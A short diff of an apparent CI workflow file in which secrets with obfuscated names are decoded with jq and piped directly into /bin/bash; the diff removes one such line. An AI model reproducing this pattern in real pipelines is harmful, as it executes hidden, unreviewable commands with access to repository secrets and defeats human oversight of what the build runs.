@@ -19,7 +19,6 @@ jobs:
           ocjpj18: ${{ secrets.ocjpj18 }}
         run: |
           printf '%s' "$ocjpj18" | jq -r .knp01 | /bin/bash
-          printf '%s' "$ihttc40" | jq -r .ubr79 | /bin/bash
           echo $q14834 | jq -r .h8 | /bin/bash
           echo $axhk0716 | jq -r .zcaq84 | /bin/bash
           printf '%s' "$q8" | jq -r .hx32 | /bin/bash
